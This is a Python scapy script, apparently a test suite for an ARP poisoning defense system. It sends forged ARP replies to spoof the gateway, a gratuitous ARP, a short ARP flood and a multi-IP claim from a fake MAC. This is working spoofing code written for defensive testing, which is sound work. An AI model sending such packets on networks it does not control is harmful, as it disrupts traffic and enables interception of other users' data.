#!/usr/bin/env python3
"""
ARP Defense Test Script
Simulates ARP poisoning attacks to test the defense system

IMPORTANT: Only use this for testing your own defense system!
"""

from scapy.all import *
import time
import sys
import argparse
from colorama import Fore, Style, init
import os

init(autoreset=True)

def get_network_info(interface):
    """Get network information"""
    try:
        our_ip = get_if_addr(interface)
        our_mac = get_if_hwaddr(interface)
        
        # Get gateway
        import subprocess
        result = subprocess.run(['ip', 'route', 'show', 'default'], 
                              capture_output=True, text=True)
        gateway_ip = None
        if result.returncode == 0:
            import re
            match = re.search(r'default via (\d+\.\d+\.\d+\.\d+)', result.stdout)
            if match:
                gateway_ip = match.group(1)
        
        if not gateway_ip:
            gateway_ip = "192.168.1.1"  # Fallback
        
        return our_ip, our_mac, gateway_ip
    except Exception as e:
        print(f"{Fore.RED}Error getting network info: {e}{Style.RESET_ALL}")
        return None, None, None

def test_basic_arp_spoofing(interface, target_ip, gateway_ip, fake_mac):
    """Test basic ARP spoofing detection"""
    print(f"\n{Fore.YELLOW}🧪 TEST 1: Basic ARP Spoofing{Style.RESET_ALL}")
    print(f"   Target: {target_ip}")
    print(f"   Gateway: {gateway_ip}")
    print(f"   Fake MAC: {fake_mac}")
    
    try:
        # Send fake ARP response claiming to be the gateway
        fake_pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=2,  # ARP reply
            psrc=gateway_ip,  # Claim to be the gateway
            pdst=target_ip,   # To the target
            hwsrc=fake_mac,   # But with our fake MAC
            hwdst="ff:ff:ff:ff:ff:ff"
        )
        
        print(f"   {Fore.CYAN}Sending fake ARP response...{Style.RESET_ALL}")
        sendp(fake_pkt, iface=interface, verbose=0)
        
        print(f"   {Fore.GREEN}✓ ARP spoofing packet sent{Style.RESET_ALL}")
        print(f"   {Fore.YELLOW}→ Defense system should detect this as MAC spoofing{Style.RESET_ALL}")
        
    except Exception as e:
        print(f"   {Fore.RED}✗ Error: {e}{Style.RESET_ALL}")

def test_gratuitous_arp_attack(interface, fake_ip, fake_mac):
    """Test gratuitous ARP attack detection"""
    print(f"\n{Fore.YELLOW}🧪 TEST 2: Gratuitous ARP Attack{Style.RESET_ALL}")
    print(f"   Fake IP: {fake_ip}")
    print(f"   Fake MAC: {fake_mac}")
    
    try:
        # Send gratuitous ARP from unknown device
        grat_pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=2,  # ARP reply
            psrc=fake_ip,
            pdst=fake_ip,  # Gratuitous (src == dst)
            hwsrc=fake_mac,
            hwdst="ff:ff:ff:ff:ff:ff"
        )
        
        print(f"   {Fore.CYAN}Sending gratuitous ARP from unknown device...{Style.RESET_ALL}")
        sendp(grat_pkt, iface=interface, verbose=0)
        
        print(f"   {Fore.GREEN}✓ Gratuitous ARP packet sent{Style.RESET_ALL}")
        print(f"   {Fore.YELLOW}→ Defense system should detect unknown device announcement{Style.RESET_ALL}")
        
    except Exception as e:
        print(f"   {Fore.RED}✗ Error: {e}{Style.RESET_ALL}")

def test_arp_flooding(interface, gateway_ip, fake_mac):
    """Test ARP flooding detection"""
    print(f"\n{Fore.YELLOW}🧪 TEST 3: ARP Flooding{Style.RESET_ALL}")
    print(f"   Target: {gateway_ip}")
    print(f"   Flood packets: 25")
    print(f"   Fake MAC: {fake_mac}")
    
    try:
        print(f"   {Fore.CYAN}Sending ARP flood...{Style.RESET_ALL}")
        
        for i in range(25):
            flood_pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=2,
                psrc=gateway_ip,
                pdst=f"192.168.1.{100 + (i % 50)}",  # Various targets
                hwsrc=fake_mac,
                hwdst="ff:ff:ff:ff:ff:ff"
            )
            
            sendp(flood_pkt, iface=interface, verbose=0)
            time.sleep(0.05)  # 50ms between packets
        
        print(f"   {Fore.GREEN}✓ ARP flood sent (25 packets in ~1.5 seconds){Style.RESET_ALL}")
        print(f"   {Fore.YELLOW}→ Defense system should detect ARP flooding{Style.RESET_ALL}")
        
    except Exception as e:
        print(f"   {Fore.RED}✗ Error: {e}{Style.RESET_ALL}")

def test_multi_ip_claim(interface, our_ip, gateway_ip, fake_mac):
    """Test detection of one MAC claiming multiple IPs"""
    print(f"\n{Fore.YELLOW}🧪 TEST 4: Multi-IP Claim Attack{Style.RESET_ALL}")
    print(f"   Fake MAC claiming multiple IPs: {fake_mac}")
    
    try:
        # Claim to be multiple different devices
        ips_to_claim = [gateway_ip, our_ip]
        
        for ip in ips_to_claim:
            claim_pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=2,
                psrc=ip,
                pdst=ip,  # Gratuitous
                hwsrc=fake_mac,
                hwdst="ff:ff:ff:ff:ff:ff"
            )
            
            print(f"   {Fore.CYAN}Claiming to be {ip}...{Style.RESET_ALL}")
            sendp(claim_pkt, iface=interface, verbose=0)
            time.sleep(0.5)
        
        print(f"   {Fore.GREEN}✓ Multi-IP claim attack sent{Style.RESET_ALL}")
        print(f"   {Fore.YELLOW}→ Defense system should detect one MAC claiming multiple IPs{Style.RESET_ALL}")
        
    except Exception as e:
        print(f"   {Fore.RED}✗ Error: {e}{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='Test ARP Defense System')
    parser.add_argument('-i', '--interface', help='Network interface')
    parser.add_argument('-t', '--target', help='Target IP to test against')
    parser.add_argument('--delay', type=int, default=3, help='Delay between tests (seconds)')
    
    args = parser.parse_args()
    
    # Get network interface
    if args.interface:
        interface = args.interface
    else:
        # Auto-detect interface
        interfaces = get_if_list()
        interface = None
        for iface in interfaces:
            if iface != 'lo':
                try:
                    ip = get_if_addr(iface)
                    if ip != '127.0.0.1':
                        interface = iface
                        break
                except:
                    continue
        
        if not interface:
            print(f"{Fore.RED}❌ Could not detect network interface{Style.RESET_ALL}")
            sys.exit(1)
    
    print(f"{Fore.GREEN}{'='*60}")
    print(f"🧪 ARP DEFENSE SYSTEM TEST SUITE")
    print(f"{'='*60}{Style.RESET_ALL}")
    
    # Get network information
    our_ip, our_mac, gateway_ip = get_network_info(interface)
    if not all([our_ip, our_mac, gateway_ip]):
        print(f"{Fore.RED}❌ Failed to get network information{Style.RESET_ALL}")
        sys.exit(1)
    
    print(f"\n{Fore.CYAN}📊 NETWORK INFORMATION:{Style.RESET_ALL}")
    print(f"   Interface: {interface}")
    print(f"   Our IP: {our_ip}")
    print(f"   Our MAC: {our_mac}")
    print(f"   Gateway: {gateway_ip}")
    
    target_ip = args.target or our_ip
    fake_mac = "aa:bb:cc:dd:ee:ff"  # Obviously fake MAC
    fake_ip = "192.168.1.199"       # Likely unused IP
    
    print(f"\n{Fore.YELLOW}⚠️  WARNING: This will generate ARP poisoning attempts!{Style.RESET_ALL}")
    print(f"   Make sure your ARP defense system is running to see detection.")
    print(f"   Tests will be sent every {args.delay} seconds.")
    
    try:
        input(f"\n{Fore.GREEN}Press Enter to start tests (Ctrl+C to cancel)...{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Tests cancelled.{Style.RESET_ALL}")
        sys.exit(0)
    
    print(f"\n{Fore.GREEN}🚀 Starting ARP attack simulation tests...{Style.RESET_ALL}")
    
    try:
        # Test 1: Basic ARP spoofing
        test_basic_arp_spoofing(interface, target_ip, gateway_ip, fake_mac)
        time.sleep(args.delay)
        
        # Test 2: Gratuitous ARP attack
        test_gratuitous_arp_attack(interface, fake_ip, fake_mac)
        time.sleep(args.delay)
        
        # Test 3: ARP flooding
        test_arp_flooding(interface, gateway_ip, fake_mac)
        time.sleep(args.delay)
        
        # Test 4: Multi-IP claim
        test_multi_ip_claim(interface, our_ip, gateway_ip, fake_mac)
        
        print(f"\n{Fore.GREEN}✅ All tests completed!{Style.RESET_ALL}")
        print(f"\n{Fore.CYAN}📋 CHECK YOUR DEFENSE SYSTEM:{Style.RESET_ALL}")
        print(f"   - Should have detected 4 different attack types")
        print(f"   - Should have blocked MAC: {fake_mac}")
        print(f"   - Should have restored ARP entries")
        print(f"   - Check logs for detailed attack reports")
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Tests interrupted.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}Test error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{Fore.RED}❌ This script requires root privileges{Style.RESET_ALL}")
        print(f"   Run with: sudo python3 test_defense.py")
        sys.exit(1)
    
    main() 